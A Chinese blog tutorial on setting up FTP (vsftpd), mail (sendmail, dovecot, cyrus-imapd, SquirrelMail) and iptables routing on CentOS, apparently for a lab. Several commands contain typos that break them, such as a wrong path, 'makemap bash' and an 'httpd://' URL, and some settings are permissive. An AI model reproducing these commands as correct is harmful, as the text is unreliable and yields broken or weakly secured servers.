/etc/vsftpd/ftpusers定义了哪些用户不能登录FTP服务器 /etc/pam.d/vsftpd定义vsftpd的PAM认证文件 /etc/vsftp/user_list与/etc/vsftpd/ftpusers一样，不过需要与主配置文件中的vsftpd.conf的“userlist_deny = YES”配合使用 /var/ftp目录为vsftpd服务器的匿名缺省共享目录 /user/share/doc/vsftpd-x.x.x目录下的所有文档作为vsftpd的帮助文档 /etc/logrotate.d/vsftpd是完成vsftpd运行之日的配置文件 /etc/pam.d/vsftpd为vsftpd指出vsftpd进行PAM认证时所使用的PAM配置文件名，没有该文件，无法使用本地用户登录ftp服务器 /usr/sbin/vsftpd为vsftpd服务器的主程序 /usr/lib/systemd/system/vsftpd.service为centos的systemd管理vsftpd服务器所运行的配置脚本 vsftpd.conf文件vsftpd.conf文件存放于/etc/vsftpd目录下。当用户安装好vsftpd程序软件，主机IP固定后，缺省情况下就可以直接启动vsftpd作为FTP服务器。此时FTP服务器允许匿名，和Linux系统本地账户登录，但是不允许匿名上传。 需要注意的是，如果通过命令ls -Zd /var/ftp得到selinux机制的上下文关联应该是： 1drwxr-xr-x, root root system u:objeck r:public_content_t:s0 /var/ftp 得到上下文关联属性为public_content_t，用户才能正常访问FTP服务。如果不是可以利用如下命令完成： 1chcon -R -t public_content_t /vat/ftp 大致可以将FTP服务器的运行情况分为以下四种 只允许匿名登录的FTP服务器，可提供下载、上传文件及相关操作服务 拒绝匿名用户访问，只允许本地真实用户访问，并限定用户登录的根目录和目录权限 匿名用户和本地真实用户均可用访问，但是将登录的本地真实用户映射为guest用户，并为其设定根目录位置，此时将建立虚拟用户 综合性的FTP服务器将以上三种类型混合设定，实现多功能服务器 ftpusers文件此文件存放在/etc/vsftpd/目录下，属于vsftpd默认许可读取的文件，只用来记录哪些用户不允许作为FTP用户登录，通常是一些系统默认的用户，包括root账户，安全因素考虑。当然可以将一些非系统默认用户进行金庸 123456789101112131415#Users that are not allowed to login via ftprootbindaemonadmlpsyncshutdownhaltmailnewsuucpoperatorgamesnobody user_list文件user_list文件存放于/etc/vsftpd/目录下，与vsftpd的内容一样，该文件可以用来设置黑白名单。但是，需要在vsftpd.conf中vaftpd.conf主配置文件中设定“userlist_deny = YES”有效后，user_list文件才标示黑名单，否则为白名单 配置vsFTP服务器匿名用户服务器实例： 某网站需要建立一台只允许匿名访问和上传的匿名FTP服务器，要求 1.匿名根目录定位到/var/ftp/pub下，该目录下三个字目录分别为upload、download和other2.允许用户下载匿名根目录下的一切文件，但是只能在根目录下的upload子目录下上传文件和创建目录3.限定用户最大传输率约为1Mb/s4.将所有上传文件的所有者改变为public用户，新创建的目录或文件设定掩码为022.5.设定服务器最大客户连接数为50，同一IP的用户最多连接数为2 为了满足上面的要求，我们应该首先建立响应的用户public，创建子目录的同时使用chmod命令更改权限 12345useradd -d /home/public publicmkdir -m 755 /var/ftp/pub/download //创建子目录download和other只给组和其他用户读和进入目录的权限，拒绝写权限mkdir -m 755 /var/ftp/pub/othermkdir -m 777 /var/ftp/pub/upload //创建upload子目录供上传，可写和修改setsebool ftpd_full_access on //开放selinux的ftpd访问权限 配置主配置文件/etc/vsftpd/vsftpd.conf的内容 1234567891011121314151617181920anonymous _enable = YESanon_root = /var/ftp/pubwrite_enable = YESmax_clients = 50max_per_ip = 2anon_ipload_enable = YESanon_mkdir_write_enable = YESanon_other_write_enable = YESdirmessage_enable = YESxferlog_enable = YESconnect_fromport_20 = YESchown_uploads = YESchown_username = publicanon_umask = 022anon_max_rate = 1024000listen = NOlisten_ipv6 = YESxferlog_std_format = YESpam_service_name = vsftpdecp_wrappers = YES 创建用户服务器vsFTP允许使用本地用户账户登录服务器，但是需要建立用户映射为guest用户进行统一管理 1.与建立虚拟用户FTP服务器相关的重要选项/参数 guest_enable = YES，所有的非匿名用户登录都映射为guest，默认为NO 设总将非匿名用户映射为guest用户，设置guest_username=public，缺省情况下值为ftp 设定local_root=/tmp，将本地用的根目录定位到/tmp目录作为根目录 此时必须设定local_enable=YES，允许本地用户登录 2.配置实例 直接将主配置文件/etc/vsftpd/vsftpd.conf的内容修改为 12345678910111213141516anonymous_enable = NOlocal_enable = YESuserlist_enable = YES //由/etc/vsftpd.user_list例如不允许访问FTP的用户guest_enable = YESguest_username = public //需要创建public用户，同时开放/home/public权限local_root = /home/publicwrite_enable = YESallow_writeable_chroot = YESdirmessage_enable = YESconnect_from_port_20 = YESchown_uploads = YESxferlog_std_format = YESpam_service_name = vsftpdlisten = NOlisten_ipv6 = YEStcp_wrappers = YES 真实用户服务器在FTP服务器的用户中，可以利用FTP服务器所属Linux主机上拥有账号的真实用户来建立FTP服务器。此时可以利用真实用户建立安全的FTP服务器，用户只能操作自己的根目录，即为用户的主目录外，不能操作其他任何目录 1.与建立真实用户服务器相关的主要关键选项 设定local_enable = YES，许可Linux的真实用户可以登录FTP，默认值为NO 可以设定所有本地用户的根目录，比如设定local_root = /tmp。如果要求锁定根目录，还需要设定chroot_list_enable = YES，并且chroot_list_file设置值为/etc/vsftpd/chroot_list文件，此时文件中的用户被约束在根目录下，根目录为用户主目录 可以为用户个人配置文件设定所在的目录，个人配置文件的格式与vsftpd.com格式相同 需要注意的是，如果在个人配置文件中加入chroot_local_user = YES或chroot_list_enables = YES是无效的 2.应用实例 例：建立真实用户，并锁定teacher 和stu用户的根目录为自己的主目录，不能操作其他目录的FTP服务器的主配置vaftpd.conf如下 1234567891011121314151617181920anonymous_enable = NO //拒绝匿名访问local_enable = YES //许可本地用户登录chroot_local_user = NOchroot_list_enable = YESallow_writeable_chroot = YESchroot_list_file = /etc/vsftpd/chroot_list //列表中用户被限制用户根目录write_enable = YESdirmessage_enable = YESxferlog_enable = YESchown_uploads = YESlocal_max_rate = 1024000xferlog_std_format = YESftpd_banner = Welcome to blah Ftp service.pam_service_name = vsftpdlisten = NOlisten_ipv6 = YESlisten_port = 2121 //设定用户可以登录的端口为2121，非标准默认端口21ftp_data_port = 2020tcp_wrappers = YES 锁定用户teacher和stu，则其他用户将不会被锁定根目录。需要在/etc/vsftpd/chroot_list中每一行加入用户名如下 12teacherstu 需要使用setsebool ftp_home_dir on命令将selinux的ftp_home_dir功能打开，否则会在登录时报错vsftpd 500 OOPS:chroot 例：对teacher用户进行单独设定，需要user_config_dir选项，其他所有用户均被锁定在自己的主目录下，主配置文件vsftpd.conf应包含内容如下 1234567891011121314151617anonymous_enable = NOlocal_enable = YESchroot_localuser = YES //锁定所有用户的根目录chroot_list_enable = NOallow_writeable_chroot = YESuser_config_dir = /etc/vsftpd/userconfdirmessage_enable = YESxferlog_enable = YESconnect_from_port_20 = YESlocal_max_rate = 1024000xferlog_std_format = YESftpd_banner = Welcome to blah FTP service.pam_service_name = vsftpdlisten = NOlisten_ipv6 = YEStcp_wrappers = YES 首先需要使用setsebool ftp_home_dir on命令将selinux的ftp_home_dir功能打开，否则会在登录时爆500错误 其次需要在/etc/vsftpd/userconf建立与用户相同的文件名teacher和stu。将teacher用户映射成guest用户public，并锁定根目录为/tmp。teacher文件内容为 123guest_enable = YESguest_username = publiclocal_root = /tmp 建立虚拟目录和iis上一样的，Linux下映射虚拟目录的命令格式为 1mount --bind [物理目录] [别名目录] 其中的–bind选项不可缺少，这种建立方式不是复制内容，只是映射挂在。如果没有使用该选项，就会出现挂载错误，它会认为物理目录不是块文件的错误。实现它的步骤为 12mkdir -m 755 /var/ftp/pub/downloadmount --bind /home/public /var/ftp/pub/download vsftpd服务器日志针对vsftp服务器的日志，需要在主配置文件vsftpd.conf中启用日志记录选项，即设定xferlog_enable = YES（默认为NO）。同时设定xferlog_std_format = YES（缺省值为NO）。如果需要制定日志文件，可以修改xferlog_file = 文件路径，缺省为xferlog_file = /var/log/xferlog E-mail服务器E-mail服务器简介对于一个完整的email服务器包含三个部分 用户代理 用户代理是指用户和email系统之间的接口，通常设计的同居就是outlook或foxmail，它们主要负责从email服务器系统上接收或发送电子邮件 邮件服务器 email服务的核心组成就是邮件服务器，主要完成转发邮件和接收邮件。常见的邮件服务器系统由两部分组成：SMTP服务器和接收邮件服务器（POP2、POP3或IMAP服务器） E-mail协议 （1）SMTP协议，中文名称为简单邮件传输协议。它属于TCP/IP协议集的应用层协议，主要功能为定义源地址到目的地址传递邮件的规则，并控制邮件的发送和中专方式 （2）POP3协议，中文名称为电子邮局。它属于应用层协议，主要完成客户端与email服务器间的邮件接收任务，即允许采用POP3协议连接到服务器上，并从服务器把邮件下载到本地客户端，还可以实现收取同时删除服务器上的邮件，当然也可以保留邮件 （3）IMAP协议，中文名称为internet信息访问协议。也属于应用程协议，与POP3一样完成邮件的收取工作，但是从功能机制上看与POP3有不同之处，IMAP需要持续不断的让客户访问服务器，而POP3协议完成邮件的存储和下载到客户端后才可以阅读邮件内容 常见E-mail服务器软件（1）SendMail服务器 看几乎所有的Linux系统都会缺省安装sendmail服务器，它成为一个很受欢迎的SMTP服务器，邮件客户量大或小，它都可以灵活的给予支持 （2）Qmai服务器 Qmail服务系统是一个模块化的邮件系统，每一个模块具有一个子功能，每一个子功能都是由一个程序运行来实现 的。而每个子功能所需的程序的属性以及运行方式由一个或多个配置文件和环境变量来控制，程序的运行不是完全以root身份运行，提高了安全性 （3）Postfix服务器 postfix具有以下特点：免费、速度快性能高、与sendmail兼容性好、系统健壮、灵活性强、安全性好 sendmail服务器配置与管理安装可以直接命令行在线安装，唯一需要注意的是，除了安装sendmail本身外，还需要安装sendmail-cf，这是sendmail配置工具 相关配置文件解释sendmail服务器的配置文件说明如下 /etc/mail/sendmail.mc和/etc/mail/sendmail.cf sendmail.mc是sendmail.cf的原始主配置文本文件，当配置完成后，需要通过m4项语言编译器编译后生成sendmail.cf文件，并重新启动sendmail服务器后，才能使得主配置生效 /etc/mail/submit.mc和/etc/mail/submit.cf submit.cf文件是submit.mc编译后的文件，作为邮件投递的初始化配置文件。通常不修改 /etc/aliases和/etc/aliases.db aliases是创建用户邮件别名的配置原文件，经过编译后生成的aliases.db被服务器读取，文件的具体位置可以通过修改sendmail.mc完成 /etc/mail/access和/etc/mail/access.db access定义了什么主机或IP地址可以访问邮件服务器，并设定它们应该有哪种类型的访问权限，通过makemap命令后得到sendmail服务进程可读取的access.db库文件 /etc/mail/domaintable和/etc/mail/domaintable.db 服务器在domaintable中配置多域名后，通过makemap编译后得到domaintable.db可被sendmail邮件服务器读取 /etc/mail/mailertable和/etc/mail/mailertable.db mailertable为邮件分发列表，通过makemap编译后可被服务进程读取的mailertable.db库文件 /etc/mail/local-host-name sendmail服务器主机名有多个，都是指向本地sendmail服务器IP的时候，可以在该文件中添加所有的主机名列表，形成可接收邮件的主机列表。如果sendmail没有在收件列表中发现相应的主机名，它将拒绝对方发来的邮件。比如 12test.commail.test.com /etc/mail/virtusertable和/etc/mail/vertusertable virtusertable文件完成虚拟用户和域列表原始配置后，通过makemap编译后可被sendmail邮件服务器读取的virtusertable.db文件。具体解释为向邮件服务器上的真实邮箱发送虚拟域和邮件的邮件列表。这些可以是本地或远程的，甚至是/etc/mail/aliases定义的别名 /etc/mail/trusted-users 在sendmail.mc中激活了FEATURE(use_ct_file)后，表明sendmail使用该文件提供可信用户名 主配置文件/etc/mail/sendmail.mcsendmail服务器的主配置文件是/etc/mail/sendmail.mc，此文件有三个主要功能：定义sendmail环境、按照接收邮件程序的语法重写地址、将地址映射成传送邮件所需的指令 为用户账户设置别名设置别名是通过修改/etc/aliases文件（位置域sendmail.mc中的激活别名位置一致）来实现的。主要是定义用户到root用户的映射，格式： 1别名：系统中的真实账号 从文件中加载别名 除了在/etc/aliases中定义别名外，还可以将别名所制定的账号存放在另一个文件中，此时需要用include的方式加载。比如要建立一个文件manege.user，内容是管理员邮件名单，如果邮件名单不属于本地邮件服务器的用户，就可以指定完整的用户邮件地址。在/etc/aliasses文件中加入 1admin: &quot;:include:/etc/manege.user&quot; 值得注意的是，引号内的冒号和其他自负不能有空格 使别名生效__ 要使别名定义有效，先在sendmail.mc中定义如下命令： 1define(&apos;ALIAS_FILE&apos;,&apos;/etc/aliases&apos;) 如果修改了/etc/aliases的内容，需要用下列命令完成生效，同时还可反映出内容设置的正确性 1/usr/bin/newaliases 控制邮件中转问题控制客户访问中转问题，需要在配置/etc/mail/sendmail.mc的时候首先激活access_db。该文件access可以为特定的域名、主机名、IP地址和用户设置特殊的操作。对access_db的功能如下 操作 说明 OK 接收该邮件，即使有其他规则要求拒绝它，仍然接收 RELAY 明确的被激活后，可以中转发送邮件 REJECT 拒绝来自该域或用户的邮件 DISCARD 完全丢弃该邮件，不向发信人返回信息 /etc/mail/access默认内容如下 1234#by default we allow relaying from localhost...localhost.localdomain RELAylocalhost RELAY127.0.0.1 RELAY 如果修改后要使配置有效，需要使用如下命令 1makemap bash /etc/mail/access.db&lt;/etc/mail/access dovecot的POP3服务器配置及应用用户需要登录到邮件服务器上才能够读取邮件或写信，而且邮件也被保留在主机上。由于sendmail只是一种MTA（邮件传输代理服务），只提供邮件的转发和本地分发功能，所以要实现客户异地接收email，需要POP3或IMAP服务器完成客户端邮件接收工作。需要安装POP3或IMA服务软件，在centos中可以选择dovecot和cyrus-imapd，dovecot和Cyrus-imapd都可以提供POP3服务和IMAP，默认监听的TCP端口为110，IMAP的默认监听的TCP端口为143 配置POP3服务1.dovecot服务的基本配置 程序包被安装好后，需要简单修改dovecot服务的配置文件/etc/dovecot/dovecot.conf内容，找到如下内容，将注释符号去掉 12protocols = imap pop3 1mtplisten = *,:: 修改/etc/dovecot/conf.d/10-mail.conf文件内容，设置邮件接收位置。由于sendmail默认将邮件存放于/var/spool/mail目录下，以用户名作为邮箱。所以，修改。/etc/dovecot/conf.d/10-mail.conf的mail_location为如下： 1mail_location = mbox:INBOX = /var/spool/%u 修改/etc/dovecot/conf.d/10-auth.conf内容如下 1/etc/dovecot/conf.d/10-mail.conf 为用户创建INBOX，比如test用户 1mkdir -p /home/john/mail/.imap/INBOX 开放防火墙端口 12firewall-cmd --add-port=25/tcpfirewall-cmd --add-port=110/tcp 2.将dovecot的POP3与sendmail结合为email客户端提供服务 如果需要将dovecot与sendmail结合为客户端提供服务 ，需要将sendmail服务的主配置文件sendmail.mc中的最后选项设置为 12MIALER(smtp)MAILER(procmail) 以上内容被确定后，需要重新编译sendmail.mc，并重新启动sendmail后次啊有效 12make -C /etc/mailservice sendmail restart 基于outlook的邮件收发客户首选的DNS服务器必须要能极细test.com，即sendmail的IP地址 （1）在outlook中设定邮件地址qz@test.com的SMTP无服务为mail.test.com(或192，168.1.1),POP3接收服务器为mail.test.com（或192.168.1.1） （2）利用john@test.com用户编辑邮件，并发送给root@test.com，抄送给john和stu1用户 （3）当上一步的邮件发送后，利用outlook接收qz@test.com发来的邮件，看看john用户能否真正的通过POP3服务端口接收邮件服务器上的邮件 配置IMAP服务器及应用配置IMAP程序1.IMAP服务的基本配置 有几个文件必须知道： /etc/cyrus.conf是cyrys-imapd服务的主配置文件，可以设置各种服务参数，比如设置IMAP、IMAPS、POP3、POP3s、SIEVE的命令项 /etc/imapd.conf是cyrus-imapd服务中的IMAP服务参数设置，比如选用的SMTP服务器、所需的认证参数值，内容： 12345678910111213configdirectory:/var/lib/imappartition-default:/var/spool/imapadmins:cyrussievedir:/var/lib/imap/sievesendmail:/usr/sbin/sendmailhashimapspool:truesasl_pwcheck_method:saslauthdsasl_mech_list:PLAIN LOGINallowplaintext:yes //将no改为yesdefaultdomain:mailtls_cert_file:/etc/pki/cyrus-imapd/cyrus-imapd.pemtls_key_file:/etc/pki/cyrus-imapd/cyrus-imapd.pemtls_ca_file:/etc/pki/tls/certs/ca-bundle.crt /usr/lib/systemd/system/cyrus-imapd.service是systemd管理启动IMAP服务配置 /etc/sysconfig/cyrus-imapd是cyrus-imapd服务的系统配置文件，可设置/etc/cron.daily/cyrus-imapd每天对邮箱复制的频率 /var/spool/imap是cyrus-imapd服务为每个用户创建一个邮箱控件的目录位置 以上是配置IMAP需要修改的地方，默认情况下也可以不用修改 2.修改sendmail的/etc/mail/sendmail.mc配置文件 当选用sendmail和cyrus-imapd作为email系统的时候，必须将sendmail.mc的配置进行修改，修改部分如下： 12345dnl MAILER(smtp)dnl //注释掉smtp服务dnl MAILER(procmail)dnl //注释掉procmail服务define(&apos;confLOCAL_MAILER&apos;,&apos;cyrussv2&apos;)dnl //去掉注释define(&apos;CYRUSV2_MAILER_ARGS&apos;,&apos;FILE /var/lib/imap/socket/lmtp&apos;)dnlMAILER(cyrusv2)dnl //去掉注释 如果想让sendmail除了本机，能从别的IP地址作为MTA，则可以修改sendmal.mc的DEAMON OPTIONS内容，将该行注释掉 也可以指定本地和指定某IP地址，例如： 1DAEMON_OPTIONS(&apos;Port=smtp,Addr=127.0.0.1,Name=MTA&apos;)dnl 配置修改完毕后，需要重新编译sendmail.mc和重新启动sendmail服务 1234m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf或者直接对所有配置修改进行编译：make -C /etc/mailservice sendmail restart 3.管理cyrus-imapd用户邮箱 当安装好cyrus-imapd服务程序后，能够默认的在/var/spool中建立一个字目录IMAP，即/etc/spool/imap目录，cyrus-imapd服务能够在该字目录下为每一个用户建立一个邮箱。创建邮箱的时候，为每个用户的每个邮箱命名，格式： 1邮箱类型.名称[。文件夹名[.文件夹名]].... 举例： Linux系统中有一个账号为qz，此时可以为用户创建邮箱。用户qz的邮箱被命名为user.qz，其中user关键字代表信箱类型为用户邮箱。如果需要为用户qz创建发件箱、垃圾箱、草稿箱，则分别在user.qz收件箱基础上被命名为：user.qz.sent、user.qz.trash喝user.qz.draft 创建和管理用户邮件信箱的具体方法： （1）为cyrus-imapd管理员账户cyrus设置密码，需要在/etc/imapd.conf中已经指明管理员名为cyrus（默认账户），并且在/etc/passwd中存在的账号 1passwd cyrus （2）使用cyradm管理命令为管理用户创建邮箱，管理命令为/usr/bin/cyradm。创建前需要确定启动了cyrus-imapd服务和asalauthd验证服务，使用createmailbox命令创建一个qz用户的邮箱及相应文件夹 123456cyradm -u cyrus localhostcreatemailbox user.qzlistmailboxcreatemailbox user.qz.sentcreatemailbox user.qz.trashcreatemailbox user.qz.drafts （3）设置用户邮箱配额空间，可以限制用户信箱使用磁盘的空间。我们可以在邮箱管理命令提示符下使用setquota命令完成使用listquota查看配额情况 12setquota user.qz 10240listquota user.qz （4）设置用户邮箱权限，cyrus-imapd管理员为用户创建邮箱后，默认只有该用户对该邮箱具有完全控制权限。如果管理员要限定用户邮箱权限，可以使用以下权限进行限定 权限 说明 none 无任何权限 read 只读权限 post 允许读取和发邮件 append 允许去读和向邮箱中插入信息 write 除具有append权限外，还有在邮箱中删除邮件的权限，但不具有更改邮箱的权限 all 具有所有权限 （5）管理员的管理命令汇总 命令 命令缩写 解释 listmailbox lm 查看或显示与给定字符串相匹配的所有的邮件名 createmailbox cm 创建一个新的邮箱 deletemailbox dm 删除一个邮箱及其所有文件夹 renamemailbox renm 邮箱改名 setaclmailbox asm 设置用户拥有邮箱的访问权限 deleteaclmailbox dam 取消用户访问邮箱的部分或全部权限 listaclmailbox lam 显示邮箱的访问权限列表 setquota sq 为用户邮箱配额空间大小 listquota lq 显示用户邮件配置 exit 退出管理状态 基于outlook方式接收邮件客户端的outlook收发电子邮件方式及配置与前面的sendmail+dovecot服务方式一样 基于web方式收发邮件基于Linux系统的第三方webmail软件主要有：horde、surgemail、squrrelmail等 1.安装PHP和quirrelmail软件 可以直接在官网下载软件包，并解压到/var/www/目录下，命令： 123tar xvzf squirrelmail-webmail-x-x-x.tar.gzsetsebool httpd_can_sendmail on //开放httpd的selinux的能够发送邮件httpd_can_network_connect on //开放httpd的selinux的能够socket连接 2.quirrelmail的基本配置 当解压squirrelmail软件后，可以进入配置阶段 （1）执行配置工具 12cd /var/www/quirrelmail-webmail-x-x-x./confifure 此时会显示配置主菜单 （2）首先在“command&gt;&gt;” 提示符右边输入2，选择server settings，则进入服务器设置。在该设置中，可以修改IMAP服务的域名，并将发送邮件的方式设定为“sendmail”等 （3）然后输入D，即进入IMAP服务器的设置。在命令提示符下输入cyrus，标示采用cyrus-imapd服务器。也可以输入dovecot标示采用dovecot服务器 （4）接着选择4，即进入全局项设置，根据图中线框的目录，在linux下创建并修改权限 123mkdir -p /var/local/squirrelmail/data/mkdir -p /var/local/s1uirrelmail/attach/chown apache.apache /var/local/squirrelmail/ （5）选择s保存数据，选择Q退出配置 3.squirrelmail的应用实现 让webmail服务器工作，需要修改apache服务器主配置文件/etc/httpd/conf/httpd.conf，增加如下文件内容 123456Alias /webmail /var/www/squirrelmail-webmail-x-x-x/&lt;Directory &quot;/var/www/squirrelmail-webmail-x-x-x&quot;&gt; Options All AllowOverride AuthConfig Require all granted&lt;/Directory&gt; 依次启动apache、sendmail和dovecot（需要先停止cyrus-imapd）服务后，就可以直接在浏览器中输入httpd://192.168.1.1/webmail/后，出现登录窗口，登录后就能进入用户收件箱，显示用户的邮件列表 Linux路由防火墙linux路由防火墙概述由于Linux带有netfilter/iptables防火墙体系，可以实现用防火墙功能解决访问控制权限问题。为了满足局域网能够接入internet网络，Linux路由防火墙具有NAT技术，实现共享访问internet网络。可以通过地址和端口映射，让外网中的主机访问Linux路由防火墙的外网接口地址及端口，然后由防火墙将地址和端口映射为局域网中的主机IP地址和端口。 Linux软路由配置centos7默认使用的是firewalld作为防火墙守护进程，儿iptables服务是关闭的 假定A子网网络为192.168.1.0/24，且与linux路由器的接口eth0相连，eth0绑定地址为192.168.1.1；B子网网络为192.168.2.0/24，且与Linux路由器的接口eth1相连，eth1绑定地址为192.168.2.1.先对路由器的接口eth0和eth1进行IP地址设置： 12ifconfig eth0 192.168.1.1 netmask 255.255.255.0 broadcast 192.168.1.255ifconfig eth1 192.168.2.1 netmask 255.255.255.0 broadcast 192.168.2.255 以上的设置仅仅对一直运行的Linux有效，如果重启就需要重新使用该命令。如果需要固定命令，可以修改/etc/sysconfig/network-scripts或/etc/sysconfig/networking/devices子目录下与接口相关的配置文件ifcfg-eth0和ifcfg-eth1等内容 最后必须打开Linux路由器的IP转发开关， 1echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward 以上这条命令修改为内存数据，重启就需要重新设置。如果让系统启动即可设定IP路由转发 功能，则需使用编辑/usr/lib/sysctl.d/50-default.conf文件，在文件中添加net.ipv4.ip_forward = 1，然后使用sysctl -p /usr/lib/sysctl.d/50-default.conf即可 除了直连网络外，如果需要访问与相信路由器连接的子网192.168.10.0/24，就需要手工添加静态路由，这样才能访问该网络 1route add -net 192.168.10.0 netmask 255.255.255.0 dev eth2 使用route -n命令即可完成路由表信息的查看 iptable防火墙设置iptables语法规则防火墙的规则制定所检查爆的特征和目标。如果包不匹配，将送往该链的下一条规则检查；如果匹配，那么下一条规则由目标值确定 目标常用专用值的解释 专用值 解释 ACCEPT 标示让这个包通过 REJECT 标示拒绝这个包，并返回一个拒绝信息 DROP 标示将这个包丢弃 QUEUE 标示把这个包传递到用户空间 RETUREN 标示停止这条链的匹配，到前一个链的规则重新开始 iptables命令语法 通用格式：iptables [-t table] command [match] [-j target / jump] 表选项 内置表的功能如下 filter表：用于过滤。当没有-t选项时，为规则表的默认值，不能更改数据包。 nat表：作为地址交换，用户要转发（路由）的信息包 mangle表：用于修改网络数据包。如果信息包及其信头内要进行任何修改，则使用mangle表。该表包含一些规则来标记用于高级路由的信息包 raw表：用于提高性能，跳过其他表，不让iptables跟踪处理过往的网络链接数据包。 命令选项 （1）-A或—append：在所选择的链末添加一条规则 （2）-D或—delete：从所选链中删除一条或多条规则 （3）-R或—replace：从选中的链中取代一条规则 （4）-I或—insert：根据给出的规则序号向所选的链中插入一条或多条规则 （5）-L或—list：显示所选链的所有规则 （6）-S或–list-rules：像iptables-save命令一样打印所选链的规则指令 （7）-F或—flush：清空所选链 （8）-Z或—zero：把所有链的包及字节的计数器清空。和-L配合使用，和在清空前查看计数器 （9）-N或—new-chain：根据给出的名称建立一个新的 用户自定义链。但是要保证不能同名 （10）-X或—delete-chain：删除指定的用户自定义链。这个链不能被引用，如果被引用，在删除之前需要删除或替换相关的规则 （11）-P或—policy：设置链的默认目标规则 （12）-E或–rename-chain：根据用户给出的名字对指定链进行重命名 match规则 （1）[!]-p或[!] —proto protocol：规则或包检查的协议。 （2）[!]-s或[!] —source is-address[/mask]：指定源IP地址，可以是主机名、网络名及IP地址 （3）[!]-d或[!] —destination address[/mask]：指定目的IP地址，与-S标志的说明类似 （4）-j或—jump target：指定包匹配规则后下面应该做什么 （5）[!] -i或[!] —in-interface input-name[+]：指定数据包由哪个接口进入。当在接口选项前使用！后，指的是相反的名称。如果接口后加上+，则所有以此接口名开头的接口都会被匹配 （6）[!] -o或[!] —out-interface output-name[+]：指定数据包由哪个接口送出，并且在链FORWARD,OUTPUT和POSTROUTING中送出数据包 匹配的对应 tcp 当—protocol tcp被指定，且其他匹配的拓未被指定时，这些拓展被装载。它提供以下选项： [!] —source-port [port[:port]] 指定端口号或源端口范围，可以是服务名或端口号，端口也可以指定包含的端口范围。 [!]—destination-port [port[:port]] 目标端口或端口范围指定，这个选项可以用–dport别名代替 [!]—tcp-flags mask comp 匹配指定的tcp标记。第一个参数是我们要检查的标记，一个用逗号分开的列表；第二个参数时用逗号隔开的标记表，是必须设置的。标记如下：SYN、ACK、FIN、RST、URG、PSH、ALL、NONE。比如 1iptables -A FORWARD -p tcp --tcp-flags SYN,ACK,FIN,RST SYN SYN只匹配那些SYN标记被设置的包，而ACK、FIN和RST标记没有设置的包 [!] —syn 只匹配设置了SYN位而清除了ACK和FIN位的tcp包 UDP [!] —source-port [port[:port]] 源端口或端口范围指定 [!] —destination-port [port[:port]] 目标端口或端口范围指定 ICMP [!] —imp-type typename 这个选项允许指定ICMP类型，可以是一个数值型的ICMP类型，或者是某个帮助命iptables -p icmp -h显示的ICMP类型名 MAC [!] —mac-source address 匹配物理地址。值得注意的是，它只对来自以太网设备并进入PREROUTING、FORWARD和INPUT链的包有效 limit 这个模块匹配标志用一个标记桶过滤器，他能和LOG目标结合使用来给出有限的登录数 —limit rate 最大平均匹配速率：可赋的值由/second、/minute、/hour或/day这样的单位。默认是3/hour —limit-burst number 待匹配包出事个数的最大值：若前面指定的–limit极限还没达到这个数值，则该数字加一，知道这个最大值数，默认值是5 muiltiport或mport 这个模块匹配一组源端口或目标端口，最多可以指定15个端口。只能和-p tcp或-p udp连用 —source-port [port[,port]] 如果源端口是其中一个给定端口则匹配，—source-port的别名位–sports —destination-port [port[,port]] 如果目标端口是其中一个给定端口则匹配，其别名位–dports —port [port[,port]] 若源端口与目的端口相等并与某个给定端口相等，则匹配 state 此模块与连接跟踪结合时，允许访问包的连接跟踪状态 —state state 这里state是一个逗号分隔的匹配连接状态列表。可能的状态是：INVSLID，表示包是未知连接；ESTABLISHED，表示是双向传送的连接；NEW，表示包位新的连接；而RELATED表示当一个连接和某个已处于ESTABLISHED状态的连接有关系时，就被认为是RELATED的，如FT数据传送，此时位FTP连接处于ESTABLISHED状态 目标拓展 LOG LOG为匹配的包开启内核记录，当在规则中设置了这一选项后，Linux内核会通过打印函数打印一些关于匹配包的信息 —log-level level 记录级别 —log-prefix prefix 在记录信息前加上特定的前缀，最多29个字符长，用来区别记录中的其他信息 —log-tcp-sequence 记录tcp序列号。如果记录能被用户读取，那么这将存在安全问题 –log-tcp-options 记录来自TCP包头部的选项 –log-ip-options 记录来自IP包头部的选项 REJECT REJECT作为对匹配包的响应，返回一个错误的包，其他情况下和DROP相同 SNAT 这个目标只适用于nat表的POSTROUTING链，它规定修改包的源地址，停止对规则的检查。它包含此选项 1--to-source ipaddr[-ipaddr][:port-port] DNAT 这个目标仅适合于nat表，而且仅在PREROUTING、OUTPUT链中有效，用户自定义链可以通过这些链来调用。包中的目的IP地址可以被修改，停止对规则的检查，它包含此选项 1--to-destination ipaddr[-ipaddr][:ipaddr] MASQUEREAD 该目标只用于nat表的POSTROUTING链，只能用于动态获取IP连接，如果拥有静态IP地址，要用SNAT。它包含此选项 1--to-ports port [-port] REDIRECT 该目标只适用于nat表的PREROUTING、OUTPUT链和只调用它们的用户自定义链。它修改包的目标IP地址来发送包到主机本身。它包含此选项 1--to-ports port [-port] 指定使用的目的端口或端口范围，不指定的话，目标端口不会被修改。只能用于指定链-p tcp或-p udp的规则 iptables包过滤防火墙基本操作保存和恢复规则设置 iptables-save命令被用来保存设定的规则，将规则写入一个指定有格式的文本文件中。而iptables-restore命令是将这个文本文件装载到内核中，使得规则有效。其基本格式如下： 1iptables-save [-c] [-t table] -c表示保存字节和包计数，便于重启后可以恢复这个数据-t表示保存哪一个表，没有指定该参数的时候，命令将自动保存所有表。 12iptables-save -c &gt; /etc/iptables-saveiptables-restore [-c] [-n] -c表示恢复字节和包计数的统计-n表示恢复的时候不覆盖正在表中已经存在的规则。如果没有使用该参数，iptables-restore将删除和销毁原来所有插入的规则 123cat /etc/iptables-save | iptables-restore -c或：iptables-restore -c &lt; /etc/iptables-save 如果Linux重启，就启动iptables-sava规则，可以将上面的命令添加到/etc/rc.d/local文件中。 路还很长]]></content>
      <tags>
        <tag>内网渗透</tag>
        <tag>环境搭建</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之Windows下服务器配置与管理]]></title>
    <url>%2F2018%2F04%2F03%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8BWindows%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86%2F</url>
